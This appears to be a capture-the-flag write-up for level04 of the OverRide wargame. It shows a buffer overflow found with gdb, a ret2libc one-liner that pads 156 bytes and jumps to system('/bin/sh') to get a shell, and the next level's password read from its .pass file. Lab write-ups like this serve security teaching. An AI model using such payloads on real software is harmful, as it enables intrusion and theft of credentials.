# Level04 Exploit

## Steps

### 1. Program Behavior
Run the program to observe its behavior:
```bash
level04@OverRide:~$ ./level04
Give me some shellcode, k

child is exiting...
```

### 2. Vulnerability Discovery
Identify the buffer overflow vulnerability:
```bash
(gdb) set follow-fork-mode child
(gdb) r
Starting program: /home/users/level04/level04
[New process 1668]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 1668]
0x41326641 in ?? ()
```

### 3. Exploiting the Vulnerability
Find necessary addresses and craft the exploit:
```bash
(gdb) info function system
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e6aed0  __libc_system
0xf7e6aed0  system

(gdb) info proc map
(gdb) find 0xf7e2c000,0xf7fcc000,"/bin/sh"
0xf7f897ec
1 pattern found.
(gdb) x/s 0xf7f897ec
0xf7f897ec: "/bin/sh"
```

### 4. Executing the Exploit
Run the exploit to gain shell access:
```bash
level04@OverRide:~$ (python -c 'print "A"*156 + "\xd0\xae\xe6\xf7" + "AAAA" + "\xec\x97\xf8\xf7"' ; cat) | ./level04
Give me some shellcode, k
whoami
level05
```

### 5. Accessing the Next Level
Retrieve the password for the next level:
```bash
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```